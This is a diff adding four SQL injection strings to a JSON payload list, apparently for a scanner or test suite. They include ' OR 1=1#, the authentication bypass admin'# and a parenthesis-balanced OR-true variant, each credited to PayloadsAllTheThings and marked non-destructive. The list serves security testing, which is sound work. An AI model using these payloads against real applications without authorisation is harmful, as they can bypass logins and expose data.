@@ -94,5 +94,37 @@
     "destructive": false,
     "source": "PayloadsAllTheThings",
     "upstream_reference": "SQL Injection — comment-based authentication-bypass testing"
+  },
+  {
+    "name": "or_true_hash",
+    "value": "' OR 1=1#",
+    "kind": "differential",
+    "destructive": false,
+    "source": "PayloadsAllTheThings",
+    "upstream_reference": "SQL Injection — MySQL hash comment boolean testing"
+  },
+  {
+    "name": "admin_hash_bypass",
+    "value": "admin'#",
+    "kind": "differential",
+    "destructive": false,
+    "source": "PayloadsAllTheThings",
+    "upstream_reference": "SQL Injection — MySQL hash comment authentication testing"
+  },
+  {
+    "name": "paren_balance_true",
+    "value": "') OR ('1'='1",
+    "kind": "differential",
+    "destructive": false,
+    "source": "PayloadsAllTheThings",
+    "upstream_reference": "SQL Injection — parenthesized grouping differential testing"
+  },
+  {
+    "name": "backslash_escape",
+    "value": "\\",
+    "kind": "syntax",
+    "destructive": false,
+    "source": "PayloadsAllTheThings",
+    "upstream_reference": "SQL Injection — escaping syntax/error detection"
   }
 ]
